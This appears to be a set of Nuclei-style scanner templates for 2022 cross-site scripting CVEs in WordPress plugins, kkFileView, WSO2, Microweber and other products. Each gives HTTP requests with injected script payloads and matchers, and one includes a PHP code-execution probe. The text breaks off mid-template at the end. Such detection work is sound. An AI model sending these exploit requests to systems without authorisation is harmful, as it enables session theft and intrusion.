- kkFileView 4.1.0 contains multiple cross-site scripting vulnerabilities via the parameter 'errorMsg.'

- severity - medium
- tags - cve,cve2022,kkFileView,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/onlinePreview?url=aHR0cHM6Ly93d3cuZ29vZ2xlLjxpbWcgc3JjPTEgb25lcnJvcj1hbGVydChkb2N1bWVudC5kb21haW4pPj1QUQ==
### Matchers

**Type - word**
- part - body
- words
    1. \<img src=1 onerror=alert(document.domain)>=PQ\</p>
    2. 该文件不
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Yonyou u8 v13.0 - Cross Site Scripting
## Description
- Yonyou u8 v13.0 was discovered to contain a DOM-based cross-site scripting (XSS) vulnerability via the component /u8sl/WebHelp.

- severity - medium
- tags - cve,cve2022,yonyou,xss

---
# WordPress GDPR & CCPA \<1.9.27 -  Cross-Site Scripting
## Description
- WordPress GDPR & CCPA plugin before 1.9.27 contains a cross-site scripting vulnerability. The check_privacy_settings AJAX action, available to both unauthenticated and authenticated users, responds with JSON data without an "application/json" content-type, and JavaScript code may be executed on a victim's browser.

- severity - medium
- tags - wpscan,cve,cve2022,wordpress,wp-plugin,wp,xss,unauth
## Requests
### Step - 1
```
GET /wp-admin HTTP/1.1
Host: {{Hostname}}

```
### Step - 2
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=check_privacy_settings&settings%5B40%5D=40&settings%5B41%5D=%3cbody%20onload%3dalert(document.domain)%3e&nonce={{nonce}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_2, 'text/html')
    2. status_code_2 == 200
    3. contains(body_2, '\<body onload=alert(document.domain)>') && contains(body_2, '/wp-content/plugins/')
- condition - and
### Extractors

**Type - regex**
- name - nonce
- part - body
- group - 1
- regex
    1. nonce":"([0-9a-z]+)
- internal - True

---
# WordPress Contact Form 7 \<1.3.6.3 - Stored Cross-Site Scripting
## Description
- WordPress Contact Form 7 before 1.3.6.3 contains an unauthenticated stored cross-site scripting vulnerability in the Drag and Drop Multiple File Upload plugin. SVG files can be uploaded by default via the dnd_codedropz_upload AJAX action.

- severity - medium
- tags - cve,cve2022,xss,wordpress,wp-plugin,wpscan,fileupload,intrusive,unauth
## Requests
### Step - 1
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------------------92633278134516118923780781161

-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="size_limit"

10485760
-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="action"

dnd_codedropz_upload
-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="type"

click
-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="upload-file"; filename="{{randstr}}.svg"
Content-Type: image/jpeg

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
-----------------------------92633278134516118923780781161--

```
### Step - 2
```
GET /wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/{{randstr}}.svg HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(body_2, "alert(document.domain)")
    2. status_code_2 == 200
- condition - and

---
# ManageEngine ADSelfService Plus \<6121 - Stored Cross-Site Scripting
## Description
- ManageEngine ADSelfService Plus before 6121 contains a stored cross-site scripting vulnerability via the welcome name attribute to the Reset Password, Unlock Account, or User Must Change Password screens.

- severity - medium
- tags - cve,cve2022,manageengine,xss,authenticated
## Requests
### Step - 1
```
POST /servlet/GetProductVersion HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. compare_versions(buildnumber, '\< 6121')

**Type - word**
- part - body
- words
    1. ManageEngine

**Type - status**
- status
    1. 200
### Extractors

**Type - regex**
- part - body
- name - buildnumber
- group - 1
- regex
    1. "BUILD_NUMBER":"([0-9]+)",
- internal - True

---
# WSO2 - Cross-Site Scripting
## Description
- WSO2 contains a reflected cross-site scripting vulnerability in the Management Console of API Manager 2.2.0, 2.5.0, 2.6.0, 3.0.0, 3.1.0, 3.2.0, and 4.0.0; API Manager Analytics 2.2.0, 2.5.0, and 2.6.0; API Microgateway 2.2.0; Data Analytics Server 3.2.0; Enterprise Integrator 6.2.0, 6.3.0, 6.4.0, 6.5.0, and 6.6.0; IS as Key Manager 5.5.0, 5.6.0, 5.7.0, 5.9.0, and 5.10.0; Identity Server 5.5.0, 5.6.0, 5.7.0, 5.9.0, 5.10.0, and 5.11.0; Identity Server Analytics 5.5.0 and 5.6.0; and WSO2 Micro Integrator 1.0.0.

- severity - medium
- tags - cve,cve2022,wso2,xss,packetstorm
## Requests
- Method - GET
### URL
- {{BaseURL}}/carbon/admin/login.jsp?loginStatus=false&errorCode=%27);alert(document.domain)//
### Matchers

**Type - word**
- part - body
- words
    1. CARBON.showWarningDialog('???');alert(document.domain)//???

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Contact Form 7 Captcha \<0.1.2 - Cross-Site Scripting
## Description
- WordPress Contact Form 7 Captcha plugin before 0.1.2 contains a reflected cross-site scripting vulnerability. It does not escape the $_SERVER['REQUEST_URI'] parameter before outputting it back in an attribute.

- severity - medium
- tags - wpscan,cve,cve2022,wordpress,xss,wp-plugin,wp
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/options-general.php?page=cf7sr_edit&">\</script>\<script>alert(document.domain)\</script>
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>
    2. Contact Form 7
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Mapping Multiple URLs Redirect Same Page \<=5.8 - Cross-Site Scripting
## Description
- WordPress Mapping Multiple URLs Redirect Same Page plugin 5.8 and prior contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the mmursp_id parameter before outputting it back in an admin page.

- severity - medium
- tags - cve,cve2022,wordpress,wp-plugin,xss,wp,authenticated,wpscan
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=mmursp-list&view=edit&mmursp_id="><svg/onload=alert(document.domain)> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. id="mmursp_id" value="\">\<svg/onload=alert(document.domain)>" />

**Type - dsl**
- dsl
    1. status_code_2 == 200
    2. contains(all_headers_2, "text/html")
- condition - and

---
# PKP Open Journal Systems 2.4.8-3.3 - Cross-Site Scripting
## Description
- PKP Open Journal Systems 2.4.8 to 3.3 contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary code via the X-Forwarded-Host Header.

- severity - medium
- tags - cve,cve2022,xss,oss,pkp-lib,edb
## Requests
### Step - 1
```
GET /iupjournals/index.php/esj HTTP/2
Host: {{Hostname}}
X-Forwarded-Host: foo"><script>alert(document.domain)</script><x=".com

```
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>\<x=".com/iupjournals

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# School Dormitory Management System 1.0 - Authenticated Cross-Site Scripting
## Description
- School Dormitory Management System 1.0 contains an authenticated cross-site scripting vulnerability in admin/inc/navigation.php:126. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - cve,cve2022,xss,authenticated
## Requests
### Step - 1
```
POST /dms/admin/login.php?f=login HTTP/1.1
Host: {{Hostname}}

username={{username}}&password={{password}}

```
### Step - 2
```
GET /dms/admin/?s=%27%3B%20alert(document.domain)%3B%20s%3D%27 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body_2
- words
    1. ''; alert(document.domain); s='';
    2. School Dormitory Management System
- condition - and

**Type - status**
- status
    1. 200

---
# HotelDruid Hotel Management Software 3.0.3 - Cross-Site Scripting
## Description
- HotelDruid Hotel Management Software 3.0.3 contains a cross-site scripting vulnerability via the prezzoperiodo4 parameter in creaprezzi.php.

- severity - medium
- tags - cve,cve2022,hoteldruid,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/creaprezzi.php?prezzoperiodo4=%22>\<script>javascript:alert(%27XSS%27)\</script>
- {{BaseURL}}/modifica_cliente.php?tipo_tabella=%22>\<script>javascript:alert(%27XSS%27)\</script>&idclienti=1
- {{BaseURL}}/dati/availability_tpl.php?num_app_tipo_richiesti1=%22>\<script>javascript:alert(%27XSS%27)\</script>
### Matchers

**Type - word**
- part - body
- words
    1. \<script>javascript:alert('XSS')\</script>
    2. HotelDruid
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Cookie Information \< 2.0.8 - Reflected Cross-Site Scripting
## Description
- The Cookie Information plugin does not escape user data before outputting it back in attributes in the admin dashboard, leading to a Reflected Cross-Site Scripting issue

- severity - medium
- tags - cve2022,wordpress,xss,wp,authenticated,cve,wp-plugin,wp-gdpr-compliance,wpscan
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```
### Step - 2
```
GET /wp-admin/admin.php?page=wp-gdpr-compliance&x=%27+onanimationstart%3Dalert%28document.domain%29+style%3Danimation-name%3Arotation+x  HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. x=\' onanimationstart=alert(document.domain) style=animation-name:rotation x'
    2. toplevel_page_wp-gdpr-compliance
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Microweber \< 1.2.12 - Stored Cross-Site Scripting
## Description
- Microweber prior to 1.2.12 contains a stored cross-site scripting vulnerability via the Type parameter in the body of POST request, which is triggered by Add/Edit Tax.

- severity - medium
- tags - cve,cve2022,authenticated,huntr,xss,microweber,cms
## Requests
### Step - 1
```
POST /api/user_login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

```
### Step - 2
```
POST /api/shop/save_tax_item HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: {{BaseURL}}/admin/view:settings

id=0&name=vat1&type="><img+src%3dx+onerror%3dalert(document.domain)>&rate=10

```
### Step - 3
```
POST /module HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer:{{BaseURL}}/admin/view:settings

class=+module+module-shop-taxes-admin-list-taxes+&id=mw_admin_shop_taxes_items_list&parent-module-id=settings-admin-mw-main-module-backend-shop-taxes-admin&parent-module=shop%2Ftaxes%2Fadmin&data-type=shop%2Ftaxes%2Fadmin_list_taxes

```
### Matchers

**Type - dsl**
- dsl
    1. contains(body_3,"\<img src=x onerror=alert(document.domain)>\</td>")
    2. contains(all_headers_3,"text/html")
    3. status_code_2 == 200 && status_code_3 == 200
- condition - and

---
# karma-runner DOM-based Cross-Site Scripting
## Description
- NPM karma prior to 6.3.14. contains a DOM-based cross-site Scripting vulnerability.
- severity - medium
- tags - oss,huntr,cve,cve2022,karma,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/karma.js
- {{BaseURL}}/?return_url=javascript:alert(document.domain)
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body_2
- words
    1. Karma

**Type - dsl**
- dsl
    1. compare_versions(version, '\< 6.3.14')
### Extractors

**Type - regex**
- name - version
- internal - True
- group - 1
- regex
    1. (?m)VERSION: '([0-9.]+)'

---
# Microweber \<1.2.15 - Cross-Site Scripting
## Description
- Microweber prior to 1.2.15 contains a reflected cross-site scripting vulnerability. An attacker can execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2022,microweber,xss,huntr
## Requests
- Method - GET
### URL
- {{BaseURL}}/module/?module=%27onm%3Ca%3Eouseover=alert(document.domain)%27%22tabindex=1&style=width:100%25;height:100%25;&id=x&data-show-ui=admin&class=x&from_url={{BaseURL}}
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. \<div class='x module module-'onmouseover=alert(document.domain) '
    2. parent-module-id
- condition - and

---
# Open edX \<2022-06-06 - Cross-Site Scripting
## Description
- Open edX before 2022-06-06 contains a reflected cross-site scripting vulnerability via the 'next' parameter in the logout URL.

- severity - medium
- tags - cve,cve2022,openedx,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/logout?next=%208%22onmouseover=%22alert(document.domain)
### Matchers

**Type - word**
- part - body
- words
    1. \<a href="+8"onmouseover="alert(document.domain)">click here to go to

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# SolarView Compact 6.00 - 'pow' Cross-Site Scripting
## Description
- SolarView Compact version 6.00 contains a cross-site scripting vulnerability in the 'pow' parameter to Solar_SlideSub.php.

- severity - high
- tags - cve,cve2022,xss,solarview,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/Solar_SlideSub.php?id=4&play=1&pow=sds%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C%22&bgcolor=green
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>\<"">
    2. SolarView
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Embed Swagger \<=1.0.0 - Cross-Site Scripting
## Description
- WordPress Embed Swagger plugin 1.0.0 and prior contains a reflected cross-site scripting vulnerability due to insufficient escaping/sanitization and validation via the url parameter found in the ~/swagger-iframe.php file, which allows attackers to inject arbitrary web scripts onto the page.

- severity - medium
- tags - cve,cve2022,swagger,xss,wordpress
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/embed-swagger/swagger-iframe.php?url=xss://%22-alert(document.domain)-%22
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- part - body
- words
    1. url: "xss://"-alert(document.domain)

---
# WordPress Related Posts \<= 2.1.2 - Cross-Site Scripting
## Description
- The Related Posts for WordPress plugin is vulnerable to stored XSS, specifically in the rp4wp[heading_text] parameter because the user input is not properly sanitized, allowing the insertion of JavaScript code that can exploit the vulnerability.

- severity - medium
- tags - wordpress,wp,wp-plugin,relatedposts,cve,cve2022,xss,authenticated,huntr
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```
### Step - 2
```
GET /wp-admin/options-general.php?page=rp4wp HTTP/1.1
Host: {{Hostname}}

```
### Step - 3
```
POST /wp-admin/options.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

option_page=rp4wp&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Drp4wp&rp4wp%5Bautomatic_linking%5D=1&rp4wp%5Bautomatic_linking_post_amount%5D=3&rp4wp%5Bheading_text%5D=%22+autofocus+onfocus%3Dalert%28document.domain%29%3E&rp4wp%5Bexcerpt_length%5D=15&rp4wp%5Bcss%5D=.rp4wp-related-posts+ul%7Bwidth%3A100%25%3Bpadding%3A0%3Bmargin%3A0%3Bfloat%3Aleft%3B%7D%0D%0A.rp4wp-related-posts+ul%3Eli%7Blist-style%3Anone%3Bpadding%3A0%3Bmargin%3A0%3Bpadding-bottom%3A20px%3Bclear%3Aboth%3B%7D%0D%0A.rp4wp-related-posts+ul%3Eli%3Ep%7Bmargin%3A0%3Bpadding%3A0%3B%7D%0D%0A.rp4wp-related-post-image%7Bwidth%3A35%25%3Bpadding-right%3A25px%3B-moz-box-sizing%3Aborder-box%3B-webkit-box-sizing%3Aborder-box%3Bbox-sizing%3Aborder-box%3Bfloat%3Aleft%3B%7D

```
### Step - 4
```
GET /wp-admin/options-general.php?page=rp4wp&settings-updated=true HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_4, 'text/html')
    2. status_code_4 == 200
    3. contains(body_4, "value=\"\" autofocus onfocus=alert(document.domain)>")
    4. contains(body_4, 'The amount of automatically')
- condition - and
### Extractors

**Type - regex**
- name - nonce
- part - body
- group - 1
- regex
    1. name="_wpnonce" value="([0-9a-z]+)" />
- internal - True

---
# WordPress XML Sitemap Generator for Google \<2.0.4 - Cross-Site Scripting
## Description
- WordPress XML Sitemap Generator for Google plugin before 2.0.4 contains a vulnerability that can lead to cross-site scripting or remote code execution. It does not validate a parameter which can be set to an arbitrary value, thus causing cross-site scripting via error message or remote code execution if allow_url_include is turned on.

- severity - medium
- tags - wpscan,cve,cve2022,wp,wordpress,wp-plugin,xss,www-xml-sitemap-generator-org
## Requests
- Method - GET
### URL
- {{BaseURL}}/?p=1&xsg-provider=%3Cimg%20src%20onerror=alert(document.domain)%3E&xsg-format=yyy&xsg-type=zz&xsg-page=pp
- {{BaseURL}}/?p=1&xsg-provider=data://text/html,\<?php%20echo%20md5("CVE-2022-0346");%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp
### Matchers

**Type - word**
- part - body_1
- words
    1. \<img src onerror=alert(document.domain)>
    2. Invalid Provider type specified
- condition - and

**Type - word**
- part - body_2
- words
    1. 2ef3baa95802a4b646f2fc29075efe34

---
# kkFileView 4.1.0 - Cross-Site Scripting
## Description
- kkFileView 4.1.0 contains multiple cross-site scripting vulnerabilities via the urls and currentUrl parameters at /controller/OnlinePreviewController.java.

- severity - medium
- tags - cve,cve2022,xss,kkfileview
## Requests
### Step - 1
```
GET /picturesPreview?urls=aHR0cDovLzEyNy4wLjAuMS8xLnR4dCI%2BPHN2Zy9vbmxvYWQ9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4%3D HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<svg/onload=alert(document.domain)>
    2. 图片预览
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# NUUO NVRsolo Video Recorder 03.06.02 - Cross-Site Scripting
## Description
- NUUO NVRsolo Video Recorder 03.06.02 contains a reflected cross-site scripting vulnerability via login.php.

- severity - medium
- tags - cve,cve2022,nvrsolo,xss
## Requests
### Step - 1
```
POST /login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: "><script>alert(document.domain)</script><"

language=en&user=user&pass=pass&submit=Login

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers, "text/html")
    2. status_code == 200
    3. contains(body,'\<script>alert(document.domain)\</script>\<\"?cmd=')
- condition - and

---
# WWBN AVideo 11.6 - Cross-Site Scripting
## Description
- WWBN AVideo 11.6 contains a cross-site scripting vulnerability in the footer alerts functionality via the 'toast' parameter, which is inserted into the document with insufficient sanitization.

- severity - medium
- tags - cve,cve2022,avideo,xss,wwbn
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?toast=%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. text: "\</script>\<script>alert(document.cookie);\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# kfm \<= 1.4.7 - Reflected Cross-Site Scripting
## Description
- Cross site scripting (XSS) vulnerability in kfm through 1.4.7 via crafted GET request to /kfm/index.php.

- severity - medium
- tags - cve,cve2022,xss,kfm
## Requests
### Step - 1
```
GET /kfm/index.php/'<script>alert(document.domain);</script> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain);\</script>
    2. x_kfm_changeCaption
    3. kfm_copyFiles
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Simple Membership \<4.1.1 - Cross-Site Scripting
## Description
- WordPress Simple Membership plugin before 4.1.1 contains a reflected cross-site scripting vulnerability. It does not properly sanitize and escape parameters before outputting them back in AJAX actions.
- severity - medium
- tags - xss,wp,wordpress,wpscan,cve,cve2022,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=swpm_validate_email&fieldId=%22%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - word**
- part - body
- words
    1. "\<script>alert(document.domain)\</script>",

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WPB Show Core - Cross-Site Scripting
## Description
- The WPB Show Core WordPress plugin through TODO does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting.

- severity - medium
- tags - wpscan,cve,cve2022,wp-plugin,wp,wordpress,xss,wpb-show-core
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/wpb-show-core/modules/jplayer_new/jplayer_twitter_ver_1.php?audioPlayerOption=1&fileList[0][title]=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - dsl**
- dsl
    1. status_code == 200
    2. contains(content_type, "text/html")
    3. contains(body, "wpb_jplayer_setting")
    4. contains(body, "\<script>alert(document.domain)\</script>")
- condition - and

---
# Active Products Tables for WooCommerce \< 1.0.5 - Cross Site Scripting
## Description
- The plugin does not sanitise and escape a parameter before outputting it back in the response of an AJAX action (available to both unauthenticated and authenticated users), leading to a Reflected cross-Site Scripting.

- severity - medium
- tags - wordpress,wp-plugin,xss,wpscan,cve,cve2022,wp
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=woot_get_smth&what={%22call_action%22:%22x%22,%22more_data%22:%22\u003cscript%3Ealert(document.domain)\u003c/script%3E%22}
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>

**Type - word**
- part - body
- words
    1. woot-content-in-popup
    2. woot-system
    3. woot-table
- condition - or

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Plugin MapPress \<2.73.4 - Cross-Site Scripting
## Description
- WordPress Plugin MapPress before version 2.73.4 does not sanitize and escape the 'mapid' parameter before outputting it back in the "Bad mapid" error message, leading to reflected cross-site scripting.

- severity - medium
- tags - cve2022,mappress,xss,wordpress,wp-plugin,wpscan,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/?mapp_iframe=1&mapid=--%3E%3Cimg%20src%20onerror=alert(document.domain)%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- part - body
- words
    1. \<img src onerror=alert(document.domain)>
    2. Bad mapid
- condition - and

---
# Reprise License Manager 14.2 - Cross-Site Scripting
## Description
- Reprise License Manager 14.2 contains a reflected cross-site scripting vulnerability in the /goform/login_process 'username' parameter via GET, whereby no authentication is required.

- severity - medium
- tags - xss,rlm,packetstorm,cve,cve2022
## Requests
- Method - GET
### URL
- {{BaseURL}}/goform/login_process?username=test%22%3E%3Csvg/onload=alert(document.domain)%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. \<svg/onload=alert(document.domain)>
    2. Login Failed
- condition - and

**Type - word**
- part - header
- words
    1. text/html

---
# WordPress RSS Aggregator \< 4.20 - Authenticated Cross-Site Scripting
## Description
- WordPress RSS Aggregator \< 4.20 is susceptible to cross-site scripting. The plugin does not sanitize and escape the id parameter in the wprss_fetch_items_row_action AJAX action before outputting it back in the response, leading to reflected cross-site scripting.
- severity - medium
- tags - wpscan,cve,cve2022,wordpress,xss,wp-plugin,authenticated
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
POST /wp-admin/admin-ajax.php?action=wprss_fetch_items_row_action HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

id=%3Chtml%3E%3Cimg+src+onerror%3Dalert%28%60document.domain%60%29%3E

```
### Matchers

**Type - word**
- part - body
- words
    1. \<img src onerror=alert(`document.domain`)>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Accessibility Helper \<0.6.0.7 - Cross-Site Scripting
## Description
- WordPress Accessibility Helper plugin before 0.6.0.7 contains a cross-site scripting vulnerability. It does not sanitize and escape the wahi parameter before outputting back its base64 decode value in the page.

- severity - medium
- tags - wordpress,wp-plugin,wp,wpscan,cve,cve2022,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/?wahi=JzthbGVydChkb2N1bWVudC5kb21haW4pOy8v
### Matchers

**Type - word**
- part - body
- words
    1. var wah_target_src = '';alert(document.domain);//';

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# School Dormitory Management System 1.0 - Authenticated Cross-Site Scripting
## Description
- School Dormitory Management System 1.0 contains an authenticated cross-site scripting vulnerability via admin/inc/navigation.php:125. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - cve,cve2022,xss,authenticated
## Requests
### Step - 1
```
POST /dms/admin/login.php?f=login HTTP/1.1
Host: {{Hostname}}

username={{username}}&password={{password}}

```
### Step - 2
```
GET /dms/admin/?page=%27%3B%20alert(document.domain)%3B%20s%3D%27 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body_2
- words
    1. ''; alert(document.domain); s='';
    2. School Dormitory Management System
- condition - and

**Type - status**
- status
    1. 200

---
# WordPress Visual Form Builder \<3.0.8 - Cross-Site Scripting
## Description
- WordPress Visual Form Builder plugin before 3.0.8 contains a cross-site scripting vulnerability. The plugin does not perform access control on entry form export, allowing an unauthenticated user to export the form entries as CSV files using the vfb-export endpoint.

- severity - medium
- tags - wpscan,cve,cve2022,xss,wordpress
## Requests
### Step - 1
```
POST /wp-admin/admin.php?page=vfb-export HTTP/1.1
Host: {{Hostname}}
Referer: {{RootURL}}/wp-admin/admin.php?page=vfb-export
Content-Type: application/x-www-form-urlencoded
Origin: {{RootURL}}

vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_end_date=0&submit=Download+Export+File

```
### Matchers

**Type - word**
- words
    1. "Date Submitted"
    2. "Entries ID"
- condition - and

**Type - status**
- status
    1. 200

---
# Packagist \<1.2.11 - Cross-Site Scripting
## Description
- Packagist prior to 1.2.11 contains a cross-site scripting vulnerability via microweber/microweber. User can escape the meta tag because the user doesn't escape the double-quote in the $redirectUrl parameter when logging out.

- severity - medium
- tags - huntr,cve,cve2022,xss,microweber
## Requests
- Method - GET
### URL
- {{BaseURL}}/demo/api/logout?redirect_to=/asdf%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. >\<script>alert(document.domain)\</script>
    2. content="Microweber"
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 404

---
# WordPress Gwyn's Imagemap Selector \<=0.3.3 - Cross-Site Scripting
## Description
- Wordpress Gwyn's Imagemap Selector plugin 0.3.3 and prior contains a reflected cross-site scripting vulnerability. It does not sanitize the id and class parameters before returning them back in attributes.

- severity - medium
- tags - cve2022,wpscan,xss,wordpress,wp-plugin,wp,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/gwyns-imagemap-selector/popup.php?id=1&class=%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
- {{BaseURL}}/wp-content/plugins/gwyns-imagemap-selector/popup.php?id=1%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script> popup-

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# CDI \< 5.1.9 - Cross Site Scripting
## Description
- The plugin does not sanitise and escape a parameter before outputting it back in the response of an AJAX action (available to both unauthenticated and authenticated users), leading to a Reflected Cross-Site Scripting.

- severity - medium
- tags - cdi,wpscan,cve,cve2022,wp-plugin,wp,wordpress,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=cdi_collect_follow&trk=%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>
    2. Tracking code not correct
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# HTML Email Template Designer \< 3.1 - Stored Cross-Site Scripting
## Description
- WordPress Email Template Designer WP HTML Mail allows stored cross-site scripting through an unprotected REST-API endpoint.
- severity - medium
- tags - wordpress,wp-plugin,xss,cve,cve2022
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?rest_route=/whm/v3/themesettings
### Matchers

**Type - word**
- part - body
- words
    1. "background":
    2. "footer":
- condition - and

**Type - word**
- part - header
- words
    1. application/json

**Type - status**
- status
    1. 200

---
# WordPress Awin Data Feed \<=1.6 - Cross-Site Scripting
## Description
- WordPress Awin Data Feed plugin 1.6 and prior contains a cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back via an AJAX action, available to both unauthenticated and authenticated users.

- severity - medium
- tags - cve,cve2022,xss,awin,wpscan,wp-plugin,wp,wordpress,authenticated
## Requests
### Step - 1
```
